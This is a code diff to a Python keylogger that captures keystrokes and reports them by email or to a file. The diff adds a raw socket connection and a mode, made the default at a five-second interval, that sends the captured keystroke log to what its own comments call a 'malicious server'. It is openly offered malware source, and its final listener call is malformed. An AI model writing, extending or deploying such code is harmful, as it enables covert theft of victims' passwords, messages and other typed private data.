@@ -1,4 +1,7 @@
 import keyboard
+import os
+import socket
+from pynput.keyboard import Key, Listener
 
 import smtplib  # SMTP protocol
 from email.mime.multipart import MIMEMultipart
@@ -11,6 +14,11 @@ REPORT_TIME = 60 # in seconds
 EMAIL_ADDRESS = "email@provider.com"
 EMAIL_PASSWORD = "pass"
 
+# Create Socket and Connect to Host
+host = socket.gethostname()
+port = 1227
+s = socket.socket()
+s.connect((host,port))
 
 # Keylogger init
 class Keylogger:
@@ -61,6 +69,16 @@ class Keylogger:
         # Console message
         print(f"[+] Saved {self.filename}.txt")
 
+    # Talks with python socket server and sends the log in real time
+    def report_to_server(self):
+        # Console message
+        print(f"[+] Sent logs to malicious server")
+
+    # TO-DO: IF not writing for 2 seconds (more or less) send logs, instead of using intervals 
+
+        # send logs to malicious server
+        s.sendall((self.log).encode('utf-8'))
+
 
     # Email implementation stuff
 
@@ -108,6 +126,8 @@ class Keylogger:
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             elif self.report_type == "file":
                 self.report_to_file()
+            elif self.report_type == "server":
+                self.report_to_server()
             # Console message
             # print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
@@ -130,8 +150,12 @@ class Keylogger:
         keyboard.wait()
 
 
-# By default file
+# By default server
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=REPORT_TIME, report_type="file")
+    keylogger = Keylogger(interval=5, report_type="server")
     # keylogger = Keylogger(interval=REPORT_TIME, report_type="email")
+    # keylogger = Keylogger(interval=REPORT_TIME, report_type="file")
     keylogger.start()
+
+with Listener(__name__=__name__) as listener :
+    listener.join() 
